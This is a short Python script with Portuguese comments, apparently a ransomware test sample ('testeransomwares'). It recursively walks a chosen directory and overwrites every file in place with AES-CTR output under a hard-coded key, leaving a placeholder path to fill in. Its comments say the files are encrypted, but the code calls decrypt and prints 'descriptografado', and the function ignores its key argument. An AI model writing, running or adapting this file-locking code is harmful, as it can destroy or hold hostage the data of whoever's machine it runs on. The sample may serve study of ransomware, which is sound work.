import os
import pyaes

# chave de criptografia
chave = b"testeransomwares"  # Ajuste para 16, 24 ou 32 bytes

def criptografa(key, input_file):
    # Abrir o arquivo a ser criptografado
    aes = pyaes.AESModeOfOperationCTR(chave)

    with open(input_file, 'rb') as fileOpen:
        file_data = fileOpen.read()

    # Criptografar o arquivo
    crypto_data = aes.decrypt(file_data)

    # Salvar o arquivo criptografado
    with open(input_file, 'wb') as fileClose:
        fileClose.write(crypto_data)

def listar_arquivos_diretorios(diretorio, diretorios_a_pular=None):
    if diretorios_a_pular is None:
        diretorios_a_pular = []

    for root, dirs, files in os.walk(diretorio):
       
       # Verifica se o diretório deve ser pulado
        if any(nome in root for nome in diretorios_a_pular):
            continue

         # Listar diretórios
        print(f"Diretório: {root}")

        # Listar arquivos
        for file in files:
            caminho_completo = os.path.join(root, file)
            criptografa(chave, caminho_completo)
            print(f"Arquivo descriptografado: {caminho_completo}")
#
# Substitua '/caminho/do/seu/diretorio' pelo caminho real do diretório que você deseja começar
caminho_do_diretorio = '/caminho/do/seu/diretorio'
diretorios_a_pular = ['diretório', 'que será','desconsiderado']
listar_arquivos_diretorios(caminho_do_diretorio, diretorios_a_pular)
